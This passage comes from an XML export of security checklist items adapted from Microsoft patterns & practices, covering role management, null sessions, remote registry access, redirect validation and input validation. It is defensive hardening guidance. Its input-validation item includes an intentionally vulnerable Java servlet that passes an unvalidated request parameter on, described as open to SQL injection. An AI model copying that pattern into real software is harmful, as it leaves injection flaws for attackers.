&lt;p&gt;&lt;strong&gt;Programmatically:&lt;/strong&gt; ASP.NET allows you to manage your application's users through the
&lt;strong&gt;Roles&lt;/strong&gt; class.&lt;/p&gt;
&lt;p&gt;Check that the following methods are used to assign users into roles: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AddUserToRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;AddUserToRoles&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;AddUsersToRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;AddUsersToRoles&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Check that the following methods are used to remove users from roles:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;RemoveUserFromRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;RemoveUserFromRoles&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;RemoveUsersFromRole&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;&lt;strong&gt;RemoveUsersFromRoles &lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Declarative:&lt;/strong&gt; Verify that the ASP.NET Role Manager is used to manage your application's users. To do so, connect to the database server that hosts your application's Role Manager. Using the following tables, verify that each user is assigned
 into the appropriate roles:
&lt;ul&gt;
&lt;li&gt;aspnet_Users &lt;/li&gt;&lt;li&gt;aspnet_Roles &lt;/li&gt;&lt;li&gt;aspnet_UsersInRoles&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Windows:&lt;/strong&gt; If your application uses Windows authentication, use the Windows
&lt;strong&gt;Local Users and Groups&lt;/strong&gt; service to manage your application's users. If your application is connected to your organization's NT Domain or Active Directory forest, delegate the user and role management to your organization's network administrators.&lt;/p&gt;
&lt;p&gt;To use the Windows &lt;strong&gt;Local Users and Groups&lt;/strong&gt; service:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Open &lt;strong&gt;Control Panel -&amp;gt; Administrative Tools -&amp;gt; Computer Management&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Under the &lt;strong&gt;System Tools&lt;/strong&gt; node in the navigation tree, select &lt;strong&gt;
Local Users and Groups&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Select &lt;strong&gt;Groups&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;For each role, double-click on the respective group. &lt;/li&gt;&lt;li&gt;Verify that only the appropriate users are added as members for the given group.
&lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Cancel&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Repeat steps 4-6 for all of your application's user roles.&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;ul&gt;
&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following segment illustrates an application's access control policy. Because the application does not enforce role-based security, it has a policy entry for each separate user.&amp;nbsp;This will make&amp;nbsp;managing the users' access rights quite difficult when the
 number of users to the application grows.&lt;/p&gt;
&lt;pre&gt;&amp;lt;authorization&amp;gt;&lt;br&gt;  &amp;lt;allow users=&amp;quot;NTDomain\joe, NTDomain\sarah, NTDomain\bill, NTDomain\sue&amp;quot; /&amp;gt;&lt;br&gt;  &amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/authorization&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about the roleManager element in web.config, visit: Documentation for
&lt;a href="http://msdn2.microsoft.com/en-us/library/ms164660(vs.80).aspx"&gt;roleManager Element (ASP.NET Settings Schema)&lt;/a&gt; in MSDN.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:8A2388A7-FC6F-47D1-B45E-C6CAC8511C78"&gt;Guideline: Perform Role-Based Security Checks
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>43bbe2c2-3ab0-49b1-8740-88cb64357933</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Null sessions (anonymous logons) are disabled.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that null sessions&amp;nbsp;are disabled to prevent an attacker connecting to&amp;nbsp;your server anonymously (without being authenticated).&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;To prevent anonymous access, disable null sessions. These are unauthenticated or anonymous sessions established between two computers. Unless null sessions are disabled, an attacker can connect to your server anonymously (without being authenticated).&lt;/p&gt;
&lt;p&gt;Once an attacker establishes a null session, he or she can perform a variety of attacks, including enumeration techniques used to collect system-related information from the target computer — information that can greatly assist subsequent attacks. The type
 of information that can be returned over a null session includes domain and trust details, shares, user information (including groups and user rights), registry keys, and more.&lt;/p&gt;
&lt;p&gt;Restrict Null sessions by setting &lt;strong&gt;RestrictAnonymous&lt;/strong&gt; to &lt;strong&gt;
1&lt;/strong&gt; in the registry at the following subkey:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HKLM\System\CurrentControlSet\Control\LSA\RestrictAnonymous=1&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information, see Microsoft Knowledge Base article 246261, &amp;quot;How To: Use the RestrictAnonymous Registry Value in Windows 2000.&amp;quot; at
&lt;a href="http://support.microsoft.com/kb/246261"&gt;http://support.microsoft.com/kb/246261&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>44c7ab43-6c2a-49b1-98ee-e3bdcb3aa76f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Remote IIS administration application is removed (\WINNT\System32\Inetsrv\IISAdmin).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that Remote IIS administration application is removed. &lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;The files used for remote IIS admin is at&amp;nbsp;%windir%\system32\inetsrv\iisadmin.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>459959a9-a01c-43f3-9d54-39fe29959c37</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Destinations of redirects and forwards are validated</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Applications&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check that destinations of redirects and forwards are validated.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;If destinations of redirects or forwards are not validated, an attacker may create hyperlinks that appear to point to legitimate sites, but actually point to malicious pages controlled by the attacker. This technique is often used by phishers to trick people
 into visiting fake sites that steal authentication credentials. In some cases, a user may gain unauthorized access by manipulating redirect or forward parameters, if destinations are not validated.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to verify that destinations of redirects and forwards are validated:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify redirects and forwards.&lt;/strong&gt; Review code to find all redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enumerate destinations.&lt;/strong&gt; Make a list of all destinations for each redirect and forward.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify access permissions.&lt;/strong&gt; Determine circumstances under which it is acceptable for each user role to access each destination.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examine each redirect and forward.&lt;/strong&gt; Verify that each redirect and forward uses mapping values instead of fully-qualified urls to determine destinations. Review the code of each redirect and forward to make sure that all destinations are validated
 to assure that users can only access resources that are authorized for them. &lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Perform the following actions to assure validation of redirects and forwards:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify redirects and forwards.&lt;/strong&gt; Review code to find all redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Map destinations.&lt;/strong&gt; Make a list of all destinations for each redirect and forward. Define mapping values for all destinations used by redirects and forwards. A mapping value is a short identifying string that symbolically represents a resource.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Define access permissions.&lt;/strong&gt; Determine circumstances under which it is acceptable for each user role to access each destination.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Validate redirects.&lt;/strong&gt; Rewrite redirects and forwards to use mapping values as input to calculate the final destinations of redirects or forwards. Add validation routines to verify that the user has permissions to access the resource, which
 is the destination of the redirect or forward.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33"&gt;Validate Destinations of Redirects and Forwards&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:83896e9e-a4cd-434c-980a-276c660984da"&gt;Use Mapping Values When Redirecting on User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>47b70bbf-3ab0-439f-a5c3-2c31ea6e584e</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Content directories have deny write ACE for anonymous Internet accounts.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that&amp;nbsp;write access to Web content directories is denied for anonymous internet accounts.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>4cb21920-fa93-4f33-a2a3-aca8bbed2dad</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Input is Validated for Length, Range, Format and Type</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check that all input is validated and treated as untrusted data. Ensure data is validated using whitelisting techniques to check against known good input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unchecked malicious input may lead to integer overflows, injection based attacks, denial of service or information disclosure.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check for this problem, use the following steps: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Find all input sources. &lt;/strong&gt;During design time identify all of the potential input sources to your application. Scour the source code to discover sources of input that may have been missed in the design. Compile a list that you can use in the
 following steps. The most common sources are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers (Host, accept types, www authentication, cache settings, encodings, etc)
&lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other services running on the system &lt;/li&gt;&lt;li&gt;Javascript variables &lt;/li&gt;&lt;li&gt;File upload and attributes (filename, size, data, etc) &lt;/li&gt;&lt;li&gt;DNS results or host names &lt;/li&gt;&lt;li&gt;External component call return values (COM, AJAX, ActiveX)&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trace data from source to sink. &lt;/strong&gt;Trace each source of input through your application until you find its ultimate destination. The final sink may be in memory, on the hard drive, sent over the network or stored in a data store such as a database.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify validation routines. &lt;/strong&gt;Each input source should have a data validation routine associated with it. Ideally the validation will occur as soon as the input reaches your application. Shared validation routines are better than creating
 many spread throughout your code base, so check for consolidation of routines to aid testing and reduce the chance of one-off bugs. If an input source does not have a validation routine associated with it, flag it for fixing.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure quality of validation routines. &lt;/strong&gt;Validation routines should check for length, range, format and type.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Validation routines should check for known good data and constrain input against each of those four categories.
&lt;/li&gt;&lt;li&gt;In web applications, look for application-supplied validators, such as a Custom Java Validator, to validate and constrain input after it is received from an input source.
&lt;/li&gt;&lt;li&gt;Ensure that all numeric fields are validated for type and range. Check for the use of regular expressions and
&lt;strong&gt;java.util.regex&lt;/strong&gt; or the use of a validator that checks numeric ranges by converting the input value to an integer or double and then performing a range check.
&lt;/li&gt;&lt;li&gt;Check that validators validate input against the least permissive expression possible that will accept all the input expected for that field.
&lt;/li&gt;&lt;li&gt;If you know that the field will have certain internal structure, ensure that is checked for.
&lt;/li&gt;&lt;li&gt;If the input has an internal checksum, like a credit card number, ensure that is checked.
&lt;br&gt;
&lt;br&gt;
Validation should check first for known valid, safe data and then for malicious, dangerous data. Do not rely on filtering out all malicious data, as it is too easy to miss something. Do not rely on client-side validation alone as it can be easily bypassed.
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Options for Constraining and Sanitizing Data&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;th&gt;Requirement&lt;/th&gt;
&lt;th&gt;Options&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Type checks&lt;/td&gt;
&lt;td&gt;Regular expressions (&lt;strong&gt;java.util.regex&lt;/strong&gt;)
&lt;p&gt;Java type system&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Length checks&lt;/td&gt;
&lt;td&gt;Regular expressions (&lt;strong&gt;java.util.regex&lt;/strong&gt;)
&lt;p&gt;&lt;strong&gt;String.length()&lt;/strong&gt; method&lt;/p&gt;
&lt;p&gt;Custom Java &lt;strong&gt;Validator&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Format checks&lt;/td&gt;
&lt;td&gt;Regular expressions for pattern matching (&lt;strong&gt;Pattern&lt;/strong&gt;, &lt;strong&gt;Matcher&lt;/strong&gt;)
&lt;p&gt;Java type system&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Range checks&lt;/td&gt;
&lt;td&gt;Custom Java &lt;strong&gt;Validator&lt;/strong&gt;
&lt;p&gt;Typed data comparisons&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Because the code does not validate its input, the application is vulnerable to SQL injection.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             String retString;&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  // The application does not validate the user-supplied data&lt;br&gt;                  retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                  retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                  retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                  out.println(retString);&lt;br&gt;                  common.aggregateData(out, searchTerm);&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                  // mechanisms. Consult the Exception Handling and&lt;br&gt;                  // Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;  }&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;A tutorial on regular expressions is available at &lt;a href="http://www.regular-expressions.info/"&gt;
Regular-Expressions.info&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information on using regular expression in Java, see: Documentation for
&lt;a href="http://java.sun.com/j2se/1.4.2/docs/api/java/util/regex/Pattern.html"&gt;Class Pattern&lt;/a&gt; in Java SDK.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>4dbe7d26-8dde-429c-b20d-4d0aac42abd9</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Remote registry access is restricted.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that remote registry access is restricted.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;The Winreg key determines whether registry keys are available for remote access. By default, this key is configured to prevent users from remotely viewing most keys in the registry, and only highly privileged users can modify it. On Windows&amp;nbsp;2000 and Windows
 Server 2003, remote registry access is restricted by default to members of the &lt;strong&gt;
Administrators&lt;/strong&gt; and &lt;strong&gt;Backup operators&lt;/strong&gt; group. Administrators have full control and backup operators have read-only access.&lt;/p&gt;
&lt;p&gt;The associated permissions at the following registry location determine who can remotely access the registry.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;To view the permissions for this registry key, run Regedt32.exe, navigate to the key, and choose
&lt;strong&gt;Permissions&lt;/strong&gt; from the &lt;strong&gt;Security&lt;/strong&gt; menu.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Some services require remote access to the registry. Refer to Microsoft Knowledge Base article 153183, &amp;quot;How to Restrict Access to the Registry from a Remote Computer,&amp;quot; to see if your situation demands limited remote registry
 access.&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>4f405937-de36-41e6-b327-e9146762c451</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Input is Validated for Length, Range, Format, and Type</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Input is validated on the server to ensure that it is in the expected format, based upon which contexts the input is used in, and encoded appropriately on output.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;An attacker passing malicious input can attempt SQL injection, cross-site scripting, and other injection attacks that aim to exploit your vulnerabilities in your application. Validating input helps to reduce these risks by ensuring that the input received
 matches the expected format. Input validation on its own is not sufficient; output encoding is also needed to fully prevent these attacks as well as to improve&amp;nbsp;reliability. Validation should always be as strict as possible, to ensure that problems do not arise
 from input thought to be out-of-range but harmless. An allow-list approach should always be taken, never a block list, to ensure that this property is maintained.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To check for this problem, use the following steps: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure&amp;nbsp;that numeric range constraints have been enforced. &lt;/strong&gt;Check that the
&lt;em&gt;RangeValidator&lt;/em&gt; control has been used to constrain the numeric input to a specific range.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that verification fields are validated. &lt;/strong&gt;Check that the
&lt;em&gt;CompareValidator&lt;/em&gt; control has been used to ensure validity for verification fields. An example of a verification field is the password entry field, where the user is required to re-type the value and the two values are compared to validate them.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that type constraints have been enforced on string fields. &lt;/strong&gt;
Check that the &lt;em&gt;RegularExpressionValidator&lt;/em&gt; control has been used to validate string input. This validator performs a variety of checks on string input fields using regular expressions.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that custom validation has been used to handle remaining input constraints.
&lt;/strong&gt;Check that the &lt;em&gt;CustomValidator&lt;/em&gt; control has been used to validate input for constraints not handled by the built-in ASP.NET validators. When the
&lt;strong&gt;CustomValidator&lt;/strong&gt; control is used, it is important to check that input has been validated for length, range, format and type. Use this validator in cases where your application might require certain business logic constraints which cannot be
 enforced by the existing validators for example. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that the Regex class is being used to validate other sources. &lt;/strong&gt;
If you need to validate input from sources other than form fields, such as query string parameters or cookies, check that the
&lt;strong&gt;Regex&lt;/strong&gt; class, within the &lt;strong&gt;System.Text.RegularExpressions&lt;/strong&gt; namespace, is being used.
&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider a very simple form for an online shopping cart. The cart component consists of two components:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;An HTML form that contains all of the fields that make up the order to be submitted for processing:&lt;/p&gt;
